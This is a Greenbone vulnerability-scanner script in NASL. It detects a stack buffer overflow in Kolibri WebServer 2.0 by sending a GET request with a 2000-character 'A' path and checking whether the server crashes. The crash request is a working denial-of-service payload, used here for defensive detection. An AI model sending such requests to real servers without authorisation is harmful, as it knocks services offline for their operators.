# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804438");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2010-5301", "CVE-2014-4158");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-04-28 15:47:50 +0530 (Mon, 28 Apr 2014)");
  script_name("Kolibri WebServer HTTP Request Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"Kolibri WebServer is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it
  is able to crash or not.");

  script_tag(name:"insight", value:"The flaw is due to an error when processing web requests and can be exploited
  to cause a stack-based buffer overflow via an overly long string passed in a
  HEAD or GET request.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.");

  script_tag(name:"affected", value:"Kolibri webserver version 2.0.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43214");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/33027");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15834");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126332");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("kolibri/banner");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:8080);

banner = http_get_remote_headers(port:port);
if(!banner || "server: kolibri" >!< banner)
  exit(0);

if(http_is_dead(port:port))
  exit(0);

req = http_get(item:string("/",crap(length:2000, data:"A")), port:port);
http_send_recv(port:port, data:req);

if(http_is_dead(port:port)){
  security_message(port:port);
  exit(0);
}

exit(99);
